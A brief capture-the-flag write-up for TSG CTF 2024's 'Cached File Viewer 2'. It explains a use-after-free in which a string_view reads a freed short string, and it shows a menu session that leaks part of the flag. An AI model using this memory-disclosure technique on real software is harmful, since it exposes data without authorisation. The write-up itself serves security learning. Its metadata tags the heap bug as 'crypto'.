---
title: "Cached File Viewer 2 - TSG CTF 2024"
category: "crypto"
subcategory: "heap"
type: "writeup"
tags: ["crypto", "heap", "cached", "file", "viewer", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "Solved by NanoApe, Yasar, LZDQ, Sceleri."
source:
  name: "CTFtime writeup #39752"
  url: "https://ctftime.org/writeup/39752"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "Cached File Viewer 2"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** Cached File Viewer 2
- **Author team:** blue-lotus
- **CTFtime:** <https://ctftime.org/writeup/39752>

---
Solved by NanoApe, Yasar, LZDQ, Sceleri.

Reading `string_view` after the original `string` being freed is undefined behaviour and will cause a invalid read. The `unique_ptr<string>` will alloc a string onto the heap then moved to the map, leaving a freed `string` chunk. If the length of the string is shorter than 24, `string` class will directly store the raw string instead of allocating a new memory. In this case, the `string_view` will point to the memory of the freed `string`. By finding a file less than 24 bytes, we can load the flag into the freed `string` chunk and read the flag.

```plaintext  
1\. load_file  
2\. read  
3\. bye  
choice > 1  
index > 1  
filename > /usr/share/debianutils/shells.d/bash  
Read 21 bytes.  
1\. load_file  
2\. read  
3\. bye  
choice > 1  
index > 1  
filename > flag  
Read 22 bytes.  
content:TSGCTF{hQAz-yXc6fLoyK  
Overwrite loaded file?(y/n) >  
```
